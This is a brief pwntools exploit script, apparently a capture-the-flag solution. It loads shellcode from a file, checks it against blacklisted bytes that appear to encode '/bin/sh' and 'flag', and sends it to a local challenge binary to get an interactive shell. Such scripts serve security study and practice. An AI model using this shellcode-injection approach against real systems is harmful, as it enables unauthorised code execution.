from pwn import *

f = open('shellcode-raw','rb') 
shell = f.read()

black = 'f668736e6962543b' + '67616c66c95fc0d2'

black  = bytes.fromhex(black)

print(f"mine {shell.hex()}")
print(f"blck {black.hex()}")

for s in shell:
    for b in black:
        if s == b:
            print(f"{s:#x}")

p = process('./execute')

payload = shell #+ (60 - len(shell) )* b'\x90'
print(payload)
print(len(payload))
# print(p.recvall(timeout=3).decode())
p.sendline(payload)
f = open("read", 'wb')
f.write(payload)
p.interactive()

